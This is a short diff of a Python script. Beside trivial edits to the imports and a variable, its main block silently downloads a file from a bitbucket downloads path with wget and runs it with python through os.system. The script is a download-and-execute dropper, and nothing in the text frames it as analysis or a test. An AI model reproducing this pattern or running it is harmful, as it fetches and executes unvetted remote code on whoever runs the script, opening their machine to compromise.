@@ -1,4 +1,4 @@
-import sys,os,errno
-x=5
+import sys,os,shutil
+l=11
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
